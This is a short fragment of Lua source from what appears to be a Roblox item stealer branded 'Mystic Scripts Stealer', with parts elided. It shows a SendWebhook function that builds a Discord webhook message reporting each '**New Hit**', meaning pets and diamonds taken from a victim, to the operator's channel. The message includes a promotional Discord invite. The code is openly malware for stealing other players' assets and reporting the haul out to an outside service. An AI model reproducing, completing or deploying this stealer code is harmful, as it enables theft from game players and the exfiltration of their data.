...
local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
    ...
    if FinalFinal ~= 0 or DiamondsDiamonds ~= 0 then
        imgs =
        "https://cdn.discordapp.com/attachments/1120173871690170380/1129759256946679818/standard.gif"
        data1 = {
            ["content"] = ping,
            ["username"] = "Mystic Scripts",
            ["avatar_url"] = imgs,
            ["embeds"] = { {
                ["title"] = "**New Hit** ||With Mystic||",
                ["url"] = "https://discord.gg/TQGnMdRPZy",
                ["type"] = "rich",
                ...
                ["fields"] = { {
                    ["name"] = "**This data was generated using Mystic Scripts Stealer** :moyai:",
